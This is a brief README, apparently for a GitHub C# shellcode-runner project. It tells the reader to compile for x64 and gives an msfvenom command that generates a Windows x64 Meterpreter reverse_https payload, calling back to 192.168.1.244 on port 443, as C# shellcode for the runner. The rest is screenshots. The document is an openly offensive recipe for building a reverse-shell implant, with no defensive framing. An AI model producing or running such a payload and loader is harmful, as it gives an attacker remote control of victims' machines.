before compiling this we must set cpu to x64 since this is 64 bit shellcode 
![image](https://github.com/VietTheBarbarian/ShellcodeRunnerC-/assets/56415307/ee0c42e2-5e1e-4f61-982d-817d9613d635)

our payload 
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.1.244 lport=443  -f csharp  
![image](https://github.com/VietTheBarbarian/ShellcodeRunnerC-/assets/56415307/188ebfad-1a70-4542-acb4-ed66f25ce7d7)

![image](https://github.com/VietTheBarbarian/ShellcodeRunnerC-/assets/56415307/21e53423-1b26-4b4c-91bd-4a281c1b4f3c)
